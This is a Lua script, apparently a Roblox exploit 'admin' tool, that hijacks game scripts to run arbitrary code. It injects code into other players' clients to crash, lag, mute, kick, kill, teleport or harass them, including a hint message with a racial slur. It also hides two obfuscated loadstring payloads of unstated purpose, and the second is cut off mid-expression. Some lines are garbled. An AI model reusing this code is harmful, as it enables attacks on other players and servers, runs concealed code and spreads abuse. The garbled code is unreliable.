--THIS IS EARTH ADMIN, PUBLISHED FROM "aleksa12432", and made by him.
--if you dont beleive, say info/ :3
--Nilcrash wont work, so don't test it.
--That is all that I need to sai.
--this is a LocalScript
--kbai, nau

wait()
LocalPlayer = game:GetServicegatogalaico").LocalPlayer
script.Parent = __EARTH__
Tabs = {}
Cmds = {}
key = "/"
chatgui = true
probemode = false
connection = nil

--not sure if it will work.
--BRanks = -1 = Kick, -2 = Lag, -3 = Mute, -4 = Rejoin
Banlist = {}
Playerlist = {}

tabmodel = Instance.new("Model", Workspace)
tabmodel.Name = "Earth tabs"
SourceName = "DSource"
--[[
SourceNames:
Alakazard: 'source'
Anaminus: 'DSource'
AntiBoomz0r: 'Source'
]]--

function NilCrash(Name)
local Crasher = Instance.new("StringValue")
Crasher.Name = "Client"
Crasher.Value = string.lower(tostring(Name))
Crasher.Parent = game:GetService("Lighting")
wait(1)
if Crasher and Crasher.Parent then
ypcall(function()
Crasher:Destroy()
end)
end
end

function Crash(name)
name = tostring(name or "nil")
local t = Instance.new("StringValue")  
t.Name = "DISC: "..name
t.Parent = game.Lighting   
game:GetService("Debris"):AddItem(t,1)
end

function Connect(player)
if game.Players[player.Name] then
if not Playerlist[player.Name] then 
NewLS(CrashSource,player:findFirstChild("Backpack"))
table.insert(Playerlist,player.Name)
Output('Connected | '..player.Name,__)
end
end
end

LagSource = [==[
wait(0)
script.Parent = nil
plr = game:GetService("Players").LocalPlayer
local plrgui = plr:findFirstChild("PlayerGui")
if plrgui == nil then repeat wait() plrgui = plr:findFirstChild("PlayerGui") until plrgui ~= nil end
while plr.Parent == game:GetService("Players") do
wait()
for i = 1, 1000 do
local sc = Instance.new("ScreenGui",plrgui)
local fr = Instance.new("TextLabel",sc)
fr.Text = "LAGGING"
fr.Size = UDim2.new(1, 0, 1, 0)
fr.FontSize = "Size48"
end
end
]==]

FunScript = [[
LP = game:service'Players'.LocalPlayer
Shapes = {"Ball", "Block"}
wait()
script.Parent = nil
Delay(0, function()
while wait() do
workspace.CurrentCamera.CameraType = "Scriptable"
workspace.CurrentCamera.FieldOfView = workspace.CurrentCamera.FieldOfView + math.random(-5,5)
workspace.CurrentCamera:SetRoll(workspace.CurrentCamera:GetRoll()+0.075)
workspace.CurrentCamera.CoordinateFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.new(math.random(-2,2),math.random(-2,2),math.random(-2,2))
local Part = Instance.new("Part", workspace.CurrentCamera)
Part.Shape = Shapes[math.random(1, 2)]
Part.Anchored = true
Part.BrickColor = BrickColor.new(math.random(),math.random(),math.random())
Part.Size = Vector3.new(math.random(5,10),math.random(-25,25),math.random(5,10))
Part.CFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.new(math.random(-250,250),math.random(-100,100),math.random(-250,250)) * CFrame.Angles(math.random(),math.random(),math.random())
local Smoke = Instance.new("Smoke", Part)
Smoke.Color = Color3.new(math.random(), math.random(), math.random()) 
Smoke.Opacity = 0.7 
local Sparkles = Instance.new("Sparkles", Part)
Sparkles.SparkleColor = Color3.new(math.random(), math.random(), math.random()) 
local Fire = Instance.new("Fire", Part)
Fire.Color = Color3.new(math.random(), math.random(), math.random()) 
Fire.SecondaryColor = Color3.new(math.random(), math.random(), math.random()) 
local Ex = Instance.new("Explosion", workspace.CurrentCamera)
Ex.Position = Vector3.new(math.random(-250,250),math.random(10,100),math.random(-250,250))
Ex.BlastPressure = 15
Ex.BlastRadius = 12.5
if not workspace.CurrentCamera:findFirstChild("Hint") then
local mes = Instance.new("Hint", workspace.CurrentCamera)
mes.Text = "OMG STOP FUCKING WITH MY SHIT YOU STUPID NIGGA"
end
end
end)
]]

CrashSource = [==[
wait(0)
script.Parent = nil
local Lig = game:GetService("Lighting")
local LP = game:GetService("Players").LocalPlayer
local LowerName = LP.Name:lower()
Lig.ChildAdded:connect(function(Obj)
if Obj.Name == "Client" and Obj.ClassName == "StringValue" and (LowerName:find(string.lower(Obj.Value)) or (LP.Character and LP.Character.Name:lower():find(string.lower(Obj.Value)))) then
pcall(function()
Obj:Destroy()
end)
LP.Parent = nil
LP.Parent = game:GetService("Players")
end
end)
]==]

coroutine.resume(coroutine.create(function()
while wait(3) do
if game:GetService("Players").Name ~= "Players" then
game:GetService("Players").Name = "Players"
end
end
end))

function Dismiss()
for i = 1, 10 do
for i = 1, #Tabs do
table.remove(Tabs, i)
if tabmodel then
tabmodel:ClearAllChildren()
end end end
end

function AddCmd(Name,Say,Desc,Func)
table.insert(Cmds,{["Name"] = Name,["Say"] = Say,["Desc"] = Desc,["Func"] = Func})
end

AddCmd('Idiots','pingtehidiots','Find out on your own',
function()
for _,v in pairs(Playerlist) do
if not game.Players[v] then
Output('(NIL) '..v, function() Output('NilCrash this person?', function() NilCrash(v) end) end)
else
Output(v,__)
end
end
end
)

AddCmd("Banlist","bl","Show the banned players",
function()
Dismiss()
for i, v in pairs(Banlist) do
Output(v["Name"]..' - BRank: '..v["BRank"], __)
end
end
)

AddCmd("Fun","fun","Make some fun for a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS(FunScript, plr.Backpack)
end
end
end
)

AddCmd("Lag player","lag","Lag a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS(LagSource, plr.Backpack)
end
end
end
)


AddCmd("Nuke","nuke","Nuke a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
a = Instance.new("Explosion", plr.Character)
a.Position = plr.Character.Torso
end
end
end
)

AddCmd("Fire","fire","Fire a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character and plr.Character.Torso then
Instance.new("Fire", plr.Character.Torso)
end
end
end
)

AddCmd("Un-fire","unfire","Remove fire from player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character and plr.Character.Torso then
pcall(function()
for j, k in pairs(plr.Character.Torso:GetChildren()) do
if k:IsA("Fire") then
k:Destroy()
end
end
end)
end
end
end
)

found = false

coroutine.wrap(function()
while found == false do
if game.PlaceId == 21053279 or game.PlaceId == 21053219 then break end
for _,scriptinworkspace in pairs(workspace:children()) do
if scriptinworkspace then
if scriptinworkspace:IsA("Script") then
if scriptinworkspace:FindFirstChild(SourceName) then
newScript = scriptinworkspace:Clone()
wait(0.2)
newScript.Name = "NewScript"
newScript.Disabled = true
newScript:FindFirstChild(SourceName).Value = ""
Output("Source found", __)
found = true 
break
end
end
end
end
wait()
end
end)()

AddCmd("Unpunish player","unpunish","Restore the player's character",
function(plrs)
for _, plr in pairs(plrs) do
if plr then
NewS("game.Players['"..plr.Name.."']:LoadCharacter()", workspace)
end
end
end
)

function NewS(sourcevalue, parent)
if game.PlaceId == 21053279 or game.PlaceId == 21053219 then 
NS(sourcevalue, parent)
else
if newScript then
local scr = newScript:Clone()
if scr:FindFirstChild(SourceName) then
if scr:FindFirstChild(SourceName) then
scr:FindFirstChild(SourceName).Value = sourcevalue
scr.Parent = parent
wait(0.5)
scr.Disabled = false
return scr
end
end
end
end
end

sorcery = script:Clone()

Services = {
game:GetService("Workspace"),
game:GetService("Players"),
game:GetService("Lighting"),
game:GetService("StarterPack"),
game:GetService("StarterGui"),
game:GetService("Teams"),
game:GetService("SoundService"),
game:GetService("Debris"),
game:GetService("InsertService"),
game:GetService("RunService"),
game:GetService("Chat"),
game:GetService("TeleportService"),
game:GetService("Geometry"),
game:GetService("MarketplaceService"),
game:GetService("BadgeService"),
game:GetService("NetworkClient"),
game:GetService("FriendService"),
}

function Explore(Item)
Dismiss()
if(Item==nil)then
for _,v in pairs(Services)do
Output(v.Name,function() Explore(v) end)
end;
else
f={
['View children']=function()
Dismiss()
for _,v in pairs(Item:children())do
Output(v.Name,function()
Explore(v)
wait()
end);
end;
end;
['View parent']=function()
Explore(Item.Parent)
end;
['Destroy']=function()
Item:Destroy();
Explore(Item.Parent);
end;
['Clear']=function()
Item:ClearAllChildren()
end;
['Clone']=function()
pcall(function()
cloneableObj = Item:clone()
end)
end;
['Remove']=function()
Item:remove()
end;
['Paste']=function()
if cloneableObj then
cloneableObj.Parent = Item
end
end;
['Ki'..'ck Item']=function()
NewLS("local plr = game:service'Players'.LocalPlayer; plr:Ki".."ck()", Item)
end;
};
for i,v in pairs(f)do
Output(tostring(i),v);
end;
Output('Item Name: \''..tostring(Item.Name)..'\'',nil);
Output('Class: \''..tostring(Item.ClassName)..'\'',nil);
if cloneableObj then
Output('Currently Cloning: \''..tostring(cloneableObj.Name)..'\'',nil);
end
end;
end;

AddCmd("Explore","explore","Explore the game",
function()
Explore()
end
)

function NewLS(sourcevalue, parent)
if game.PlaceId == 21053279 or game.PlaceId == 21053219 then 
NLS(sourcevalue, parent) 
else
local NS = sorcery:Clone()
NS.Name = "NewLocal"
local Source = NS:findFirstChild(SourceName)
if Source == nil then Instance.new('StringValue',NS).Name = SourceName end Source = NS:findFirstChild(SourceName)
Source.Value = sourcevalue
NS.Parent = parent
NS.Disabled = false
return NS
end
end

Clothes = {}

for _,Item in pairs(LocalPlayer.Character:GetChildren()) do
if Item:IsA('CharacterMesh') or Item:IsA('Hat') or Item:IsA('Shirt') or Item:IsA('Pants') then
table.insert(Clothes,Item:Clone())
end
end
for i,v in pairs(LocalPlayer.Character:GetChildren()) do
if v:IsA("BodyColors") then
body = v
torsocolor = body.TorsoColor
leftlegcolor = body.LeftLegColor
rightlegcolor = body.RightLegColor
leftarmcolor = body.LeftArmColor
rightarmcolor = body.RightArmColor
headcolor = body.HeadColor
end
end

mouse = LocalPlayer:GetMouse()

mouse.KeyDown:connect(function(key)
if key == "z" then
game:service'StarterGui':SetCoreGuiEnabled(4, true)
end 
end)

AddCmd("Toogle ChatGUI","chat","Toogle ChatGUI on/off",
function(plrs, msg)
if msg == "off" then
chatgui = false
elseif msg == "on" then
chatgui = true
end
end
)

AddCmd("Set WalkSpeed","ws","Set the walkspeed of player",
function(plrs, msg)
local keypos = msg:find(key)
local targPlayers = msg:sub(1,keypos-1)
local plrs = getPlayers(targPlayers)
local speed = msg:sub(tonumber(keypos+1))
for _,v in pairs(plrs) do
if v.Character ~= nil and v.Character:findFirstChild("Humanoid") ~= nil then
v.Character:findFirstChild("Humanoid").WalkSpeed = speed
end
end
end
)

AddCmd("Teleport","tp","Teleport a player to a place",
function(plrs, msg)
local keypos = msg:find(key)
local targPlayers = msg:sub(1,keypos-1)
local plrs = getPlayers(targPlayers)
local id = msg:sub(tonumber(keypos+1))
for _,v in pairs(plrs) do
if v and v.Backpack then
NewLS([[game:service'TeleportService':Teleport(]]..id..[[)]], v.Backpack)
end
end
end
)

Bad_Char = ""

function chatgui(msg)
if not chatgui then return end
if probemode == false then
if LocalPlayer.Character:findFirstChild("Head") then
mainPart = LocalPlayer.Character:findFirstChild("Head")
end
end
if probemode == true then
if game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") then
mainPart = game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe")
end
end
local bg = Instance.new("BillboardGui", mainPart)
bg.Adornee = mainPart
bg.Name = "CHATGUIBG"
bg.Size = UDim2.new(4, 0, 2.5, 0)
bg.StudsOffset = Vector3.new(-4, 2, 0)
local bg2 = Instance.new("BillboardGui", mainPart)
bg2.Adornee = mainPart
bg2.Name = "CHATGUIBG2"
bg2.Size = UDim2.new(4, 0, 2.5, 0)
bg2.StudsOffset = Vector3.new(-4, 4.5, 0)
local text = Instance.new("TextLabel", bg)
text.Size = UDim2.new(3, 0, 0.5, 0)
text.FontSize = "Size18"
text.TextScaled = true
text.TextTransparency = 0
text.BackgroundTransparency = 1 
text.TextTransparency = 0
text.TextStrokeTransparency = 0
text.Font = "Arial"
text.TextColor = BrickColor.new("Toothpaste")
text.Text = " "
Message = msg:sub(1)
if #Message >50 then return end
for i = 0, #Message, 1 do
wait(0.01)
text.Text = string.gsub("["..LocalPlayer.Name.."]: "..Message:sub(0, i),'fuck','fuck')
end
wait()
coroutine.resume(coroutine.create(function()
for i = 0, 5, 0.05 do
if bg ~= nil then
if bg2 ~= nil then
wait()
bg2.StudsOffset = bg2.StudsOffset + Vector3.new(0, 0.05, 0)
end
bg.StudsOffset = bg.StudsOffset + Vector3.new(0, 0.05, 0)
end
end
end))
for i=text.TextTransparency,1,0.02 do
wait()
text.TextTransparency = i
text.TextStrokeTransparency = i
end
if bg == nil then return end
bg:Destroy()
if bg2 == nil then return end
bg2:Destroy()
end

LocalPlayer.Chatted:connect(chatgui)

AddCmd("Message","m","Make a message over the screen",
function(plrs, msg)
Message = msg
NewS([[
a = Instance.new("Message", workspace)
a.Text = ]].."[ "..LocalPlayer.Name.." ]: "..Message, workspace)
end
)

AddCmd("Hint","h","Make a message at top of the screen",
function(plrs, msg)
Hint = msg
NewS([[
a = Instance.new("Hint", workspace)
a.Text = ]].."[ "..LocalPlayer.Name.." ]: "..Hint, workspace)
end
)

AddCmd("Commands","cmds","Show the list of commands",
function()
Dismiss()
for i, v in pairs(Cmds) do
Output(v["Name"],
function()
Output("Description: "..v["Desc"], __)
Output("Usage: "..v["Say"], __)
Output("Name: "..v["Name"], __)
end)
end
end
)

AddCmd("Rejoin player","rej","Rejoin the player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'TeleportService':Teleport(game.PlaceId)", plr.Backpack)
end
end
end
)

AddCmd("Create base","base","Create the base",
function()
a = Instance.new("Part")
a.Parent = Workspace
a.Name = "Base"
a.Position = Vector3.new(0, 0.6, 0)
a.Size = Vector3.new(1002, 0, 1002)
a.Material = "Grass"
a.Anchored = true
a.BrickColor = BrickColor.new("Dark green")
end
)

AddCmd("Ping","ping","Ping something",
function(plrs, msg)
if msg == "" then
Output("pong", __)
else
Output(msg, __)
end
end
)

AddCmd("Dismiss","dis","Dismiss tabs",
function()
Dismiss()
end
)

AddCmd("Probe mode", "probe", "Be a ball and fly around",
function()
probemode = true
Dismiss()
if LocalPlayer.Character then LocalPlayer.Character = nil end
if workspace.CurrentCamera == nil then return end
local camera = workspace.CurrentCamera
local probe = Instance.new("Part", workspace)
M = Instance.new("SpecialMesh", probe)
M.MeshId = "http://www.roblox.com/asset/?id=10061232"
M.TextureId = "http://www.roblox.com/asset/?id=10061209"
M.Scale = Vector3.new(3, 3, 3)
probe.TopSurface = 0
probe.Anchored = true
probe.BottomSurface = 0
probe.Name = LocalPlayer.Name.."'s probe"
local rotation = 0
local bbg = Instance.new("BillboardGui", probe)
bbg.Size = UDim2.new(3, 0, 3 ,0)
bbg.ExtentsOffset = Vector3.new(0, 2, 0)
local txt = Instance.new("TextLabel", bbg)
txt.FontSize = "Size24"
txt.Font = "SourceSansBold"
txt.Text = LocalPlayer.Name
txt.BackgroundTransparency = 1
txt.TextColor = BrickColor.new("Really red")
txt.TextStrokeTransparency = 0
txt.Size = UDim2.new(1,0,1,0)
local pl = Instance.new("PointLight", probe)
pl.Shadows = true
pl.Range = 20
coroutine.wrap(function()
while pl ~= nil do
pl.Color = Color3.new(math.random(), math.random(), math.random())
wait(0.8)
end
end)()
coroutine.wrap(function()
while LocalPlayer.Character == nil and probe.Parent == workspace and probe ~= nil and game:service'RunService'.Stepped:wait() do
probe.CFrame = camera.Focus * CFrame.Angles(0, rotation, 0)
rotation = rotation + 0.1
end
if camera then
camera:Destroy()
end
probe:Destroy()
end)()
end
)

AddCmd("Make your character","char","Creates your character",
function()
if workspace.CurrentCamera == nil then return end
local camera = workspace.CurrentCamera
local new_char = game:service("InsertService"):LoadAsset(68452456):GetChildren()[1]
local human = new_char.Humanoid
human.Parent = nil
new_char.Name = LocalPlayer.Name
wait()
human.Parent = new_char
camera.CameraSubject = human
camera.CameraType = "Custom"
new_char.Parent = workspace
local pl = Instance.new("PointLight", new_char.Head)
pl.Range = 24
pl.Shadows = true
LocalPlayer.Character = new_char
new_char:MakeJoints()
new_char.Torso.BrickColor = torsocolor
new_char["Left Leg"].BrickColor = leftlegcolor
new_char["Right Leg"].BrickColor = rightlegcolor
new_char["Left Arm"].BrickColor = leftarmcolor
new_char["Right Arm"].BrickColor = rightarmcolor
new_char.Head.BrickColor = headcolor
for i,v in pairs(Clothes) do
v:Clone().Parent = new_char
end
probemode = false
end
)

AddCmd("Stop the commands","cremove","Remove the commands",
function()
Output("Are you sure that you wan't to remove the Earth admin?",
function()
Output("Are you 100% sure that you want this???",
function()
for i,v in pairs(getfenv(1)) do
getfenv(1)[i] = nil
end
script.Disabled = true
LocalPlayer = NO_PLAYER
script:findFirstChild(SourceName).Value = " "
script.Disabled = true
tabmodel:ClearAllChildren()
tabmodel:Destroy()
connection:disconnect()
Tabs = {}
Cmds = {}
Banlist = {}
fukhed.all = true
coroutine.resume(coroutine.create(function()
while wait(0.1) do
Dismiss()
end
end))
end)
end)
end
)

AddCmd("ForceField","ff","Give forcefield to player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
Instance.new("ForceField", plr.Character)
end
end
end
)

AddCmd("Sparkles","sparkles","Give sparkles to player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character and plr.Character.Torso then
Instance.new("Sparkles", plr.Character.Torso)
end
end
end
)

AddCmd("Un-Sparkles","unsparkles","Remove sparkles from player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character and plr.Character.Torso then
pcall(function()
for j, k in pairs(plr.Character.Torso:GetChildren()) do
if k:IsA("Sparkles") then
k:Destroy()
end
end
end)
end
end
end
)

AddCmd("Crash player","crash","Crash the player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("repeat until false", plr.Backpack)
end
end
end
)

AddCmd("Respawn player","respawn","Respawn the player",
function(plrs)
for _, plr in pairs(plrs) do
NewS("game.Players['"..plr.Name.."']:LoadCharacter()", workspace)
end
end
)

AddCmd("Mute player","mute","Block the player chat",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'StarterGui':SetCoreGuiEnabled(3, false)", plr.Backpack)
end
end
end
)

AddCmd("Unmute player","unmute","Unblock the player chat",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'StarterGui':SetCoreGuiEnabled(3, true)", plr.Backpack)
end
end
end
)

AddCmd("Un-ForceField","unff","Remove the forcefield that you gave to player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
pcall(function()
for _,v in pairs(plr.Character:GetChildren()) do
if v:IsA("ForceField") then
v:Destroy()
end
end
end)
end
end
end
)

AddCmd("God player","god","Make the player immortal",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character and plr.Character.Humanoid then
plr.Character.Humanoid.MaxHealth = math.huge
end
end
end
)

AddCmd("Ungod player","ungod","Make the player mortal",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
plr.Character.Humanoid.MaxHealth = 100
end
end
end
)

AddCmd("Kick player","kick","Kick a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'StarterGui':SerCoreGuiEnabled(3,false)", plr.Backpack)
plr:Destroy()
end
end
end
)

AddCmd("Kill player","kill","Kill a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
plr.Character:BreakJoints()
end
end
end
)

AddCmd("Punish player","punish","Remove character of a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
plr.Character:Destroy()
end
end
end
)

AddCmd("Admin a player","admin","Give admin to a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
a = sorcery:Clone()
a.Parent = plr.Backpack
Output("You gave admin to: "..plr.Name, __)
end
end
end
)

AddCmd("Fix cam","fcam","Fix anyone's cam",
function(plrs, msg)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS([[
game.Workspace.CurrentCamera:Destroy()
cam = Instance.new("Camera", workspace)
cam.Name = "CurrentCamera"
cam.FieldOfView = 70
cam.CameraType = "Custom"
cam.CameraSubject = game.Players.LocalPlayer.Character.Humanoid]], plr.Backpack)
end
end
end
)

AddCmd("AFK","afk","Ping yourself as afk",
function()
Dismiss()
for i = 1,8 do
wait()
Output("AFK", __)
end
end
)

AddCmd("Back","back","Ping yourself as back",
function()
Dismiss()
for i = 1,8 do
wait()
Output("Back", __)
end
wait(3)
Dismiss()
end
)

AddCmd("Ban a player","ban","Kicks a player when he enters",
function(plrs, msg)
local keypos = msg:find(key)
local targPlayers = msg:sub(1,keypos-1)
local plrs = getPlayers(targPlayers)
local BRank = msg:sub(tonumber(keypos+1))
for _,v in pairs(plrs) do
if v then
table.insert(Banlist,{["Name"] = v.Name, ["BRank"] = BRank})
end
end
end
)

local charMap = {["+"] = 0, ["^"] = 1, ["%"] = 2, [")"] = 3, ["*"] = 4, ["$"] = 5, ["-"] = 6, ["_"] = 7, ["#"] = 8, ["&"] = 9, ["@"] = 10, ["("] = 11, ["?"] = 12, ["~"] = 13, ["!"] = 14, ["="] = 15}; setfenv(assert(loadstring((string.gsub(string.gsub(table.concat({
"?-=-)-^-?-+%&-~)~%^)()?-=-^-*-)_*_%_&-!-_-#%)_*_%_&-!-_-!%_-)_$_%-#B%!*!_~*~!~^&&~?@(&!&_@_~&~@A?@~@~_~~?^~&?&#)~)~+~-?@?%?##+?(A?#(~_-_(=?=!!@!)=$@?!!(?@!@-($!-!-~_~*!)!=~*~_~!?~#-~$~^~-?&?+?$#?(-?-?^($_~-@$@$(*-*~&^(~=$##$&$?$?$^^!A=-+&%#)$)*%!%~%!~=^=^!+!+?$+)%)-)#^)^_+&+==~($+)+!=%=*=@!!@*!~!?!-~&&+&&@#?*?=&$?#($($_(-#&*@=@%@$@$@~*%&)&_#?#()^*$#*&)_*_#-~-?^?$%%*^_)#$?*^$+$_*_)-*_)-)#C)**~^?$+)%)-))%$%+%#?_^)+!+^+*+*+!@*(!#-!^=+%$!-~~^%!)~$~+~-#)#+-#(~(?(#(#?&@?$?$$_*$+-A@(-*@$!)!_$#?^$#~(A?-)_)%+%~=!)+-($)$*$=*==$==!~!)=)!!^?$+)%)-)+!~(*^#-?_&+(@?!!+&+^+%+~=~@)@+~?~_!@C~$#@?+~&_%?%(^(!@$-)@-(&$^(%A&!#+&*&!_@*_*$*+*()^#^%&_?$?$*-+-&$*$!*~*&*!)_*!)!%_)-=^=-=$)_B~?#+*+@?_@#!?$!-$+~=!=&=&@=&+~@A~+~#~%~-?~_~?*?^_!--?(#)@+(!@?@@@@&!*(#@#=#_###%&*)@)@%$-^-_%*+$*_-%-@$($-$-+?=?%_)+*~)=%^)!-+*+*%**~?%!~--&)@)~))?&?&(*=+=-()&@!=!^!)#!&(#%&$#!#=_-#~(&?=(^(=(^(*(+(_-=&%-=&+_&&#$($%--&-#%&+&@#)#%)%#+#(_=-^__-(%~$=$$$)--^)^($&$*$#*@*+**+$)&*^*=%="
,"!_%@!&!!!)!!^(~*~??(~$^@~#~#?^+_+@=!+=^#($(^(=@=-__(-$__-=-_@*((@!&~@+@*@^@&$%&-$*&--+&+$*$?$?$^&%#=#!#&#)#))*#)#=_*___!-))--&-+-=-)%^%@-&-$-@$~$*$&^(*+-&$#*&+%*-+-+%^#+++?)@=*=~!~=!=~=!!#%=%)%-!*!^!+!%#(#+#(#!__#+?!?-?@(@?!()?^?@_*(&_#((#-(__?_$#((~@((((_(%()-$($(%(#@?@*@@-!&%@@&@@=$!$#@#@$@(&=&_&~$+&-@+@+&%$?#^$%$)$($*$!*(#@*$*=)+$%$%$**=__#?_+*=)~)~)%%?%%%!%%%?%--$_!-)-*_&-=-!-#%)-&%&-~)&-(%^)()%_$-*_$_%_!-+%)_*_%_&-!-_-!%)-#-^-%_#%#%)_*_%_&-!-_-!%%-&_*_$-#%)-&%(%~%^)^)#)(%&-&%$%+%%)$)-)&%$-!-*-&%&%#%&%"
}),"(%u)(.)",function(r,c)return c:rep(r:byte()-62)end),"(.)(.)",function(lo,hi)return string.char(charMap[lo]+charMap[hi]*16)end)))),getfenv())()

AddCmd("Shutdown the game","sd","Shutdown the game",
function()
NewS([[while true do
game:GetService("Players"):ClearAllChildren()
end
]], workspace)
end
)

AddCmd("Check source","chks","Check if the source is found",
function()
if found then
Output("Source is found")
else
Output("Source is not found")
end
end
)

AddCmd("Say bye to everyone","bye","Say bye to everyone",
function()
Dismiss()
for i = 1,8 do
Output("Bye", __)
end
end
)

AddCmd("Check source name","chksn","Check the source name",
function()
Output(SourceName, __)
end
)

AddCmd("Change source name","csn","Change the source name",
function(plrs, msg)
SourceName = tostring(msg)
end
)

AddCmd("Kick player list","klist", "Show a kick player list",
function()
Dismiss()
Output("Click on the player name that you want to kick", __)
for _,v in pairs(game:GetService("Players"):GetChildren()) do
Output(v.Name,
function()
NewLS("game:service'StarterGui':SetCoreGuiEnabled(3, false)", v.Backpack)
v:Destroy()
end)
end
end
)

AddCmd("Script","script","Execute a Script",
function(plrs, msg)
NewS(msg, workspace)
end
)

AddCmd("LocalScript","local","Execute a LocalScript",
function(plrs, msg)
NewLS(msg, LocalPlayer.Backpack)
end
)

AddCmd("Execute", "exe","Execute a LocalScript for admin",
function(plrs, msg)
a,b = ypcall(function()
loadstring(msg)()
end) if not a then Output(b,"Bright red") end
end
)


AddCmd("#Commands","#cmds","See how much are commands in this admin",
function()
Output(#Cmds, __)
end
)

AddCmd("Clean workspace","clean","Clean everything in workspace except terrain",
function()
NewS([[
for _,v in pairs(game.Workspace:GetChildren()) do
if v.Name ~= "Terrain" then
v:Destroy()
end
end
]],workspace)
wait(1)
a = Instance.new("Part")
a.Parent = Workspace
a.Name = "Base"
a.Position = Vector3.new(0, 0.6, 0)
a.Size = Vector3.new(1002, 0, 1002)
a.Material = "Grass"
a.Anchored = true
a.BrickColor = BrickColor.new("Dark green")
NewS([[
for _,v in pairs(game.Players:GetChildren()) do
v:LoadCharacter()
end
]], workspace)
end
)

AddCmd("YOLO","yolo","YOLO",
function()
Dismiss()
for i = 0,8,1 do
Output("YOLO",__)
end
end
)

AddCmd("SWAG","swag","SWAG",
function()
Dismiss()
for i = 0,8,1 do
Output("SWAG",__)
end
end
)

function Output(Txt, func)
P = Instance.new("Part", tabmodel)
P.Shape = "Ball"
P.Anchored = true
P.CanCollide = false
if probemode == false then
if LocalPlayer.Character.Torso then
P.Position = LocalPlayer.Character.Torso.Position
elseif LocalPlayer.Character.Torso == nil then return end
elseif probemode == true then
if game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") then
P.Position = game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe").Position
elseif game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") == nil then return end
else
return
end
M = Instance.new("SpecialMesh",P)
M.MeshId = "http://www.roblox.com/asset/?id=10061232"
M.TextureId = "http://www.roblox.com/asset/?id=10061209"
M.Scale = Vector3.new(3,3,3)
Instance.new("PointLight", P)
bg = Instance.new("BillboardGui", P)
bg.Adornee = tab
bg.Size = UDim2.new(8, 0, 7.5, 0)
bg.StudsOffset = Vector3.new(0, 1, 0)
text = Instance.new("TextLabel", bg)
text.Size = UDim2.new(1, 0, 0.2, 0)
text.FontSize = "Size18"
text.BackgroundTransparency = 1
text.Font = "Legacy"
text.TextStrokeTransparency = 0
text.TextColor = P.BrickColor
text.Text = Txt
Click = Instance.new("ClickDetector",P)
Click.MouseClick:connect(function(Plr)
if Plr.Name == LocalPlayer.Name then
Dismiss()
func = func
func()
end
end)
table.insert(Tabs, P)
end

function getPlayers(msg)
local plrs = {}
if msg == "me" then
table.insert(plrs, LocalPlayer)
elseif msg == "all" then
plrs = game:GetService("Players"):GetChildren()
elseif msg == "noobs" then
for _,plr in pairs(game:GetService("Players"):GetChildren()) do
if plr.AccountAge > 364 then
table.insert(plrs, plr)
end
end
elseif msg == "veterans" then
for _,plr in pairs(game:GetService("Players"):GetChildren()) do
if plr.AccountAge > 364 then
table.insert(plrs, plr)
end
end
elseif msg == "others" then
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if v ~= LocalPlayer then
table.insert(plrs, v)
end
end
else
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if v.Name:lower():sub(1,#msg) == msg:lower() then
if v.Name == "aleksa12432" then
Output("You can't use commands on creator!!!")
else
table.insert(plrs, v)
end
end
end
end
return plrs
end

for _,plr in pairs(game:GetService("Players"):GetChildren()) do
end

LocalPlayer.Chatted:connect(function(m)
for i,v in pairs(Cmds) do
if v["Say"]..key == m:sub(1, #v["Say"]+#key) then
v["Func"](getPlayers(m:sub(#v["Say"]+#key+1)), m:sub(#v["Say"]+#key+1))
end
end
end)
	
local charMap = {["!"] = 0, ["$"] = 1, ["*"] = 2, ["("] = 3, ["-"] = 4, ["#"] = 5, ["%"] = 6, ["?"] = 7, ["="] = 8, ["&"] = 9, ["_"] = 10, ["+"] = 11, ["~"] = 12, [")"] = 13, ["^"] = 14, ["@"] = 15}; setfenv(assert(loadstring((string.gsub(string.gsub(table.concat({
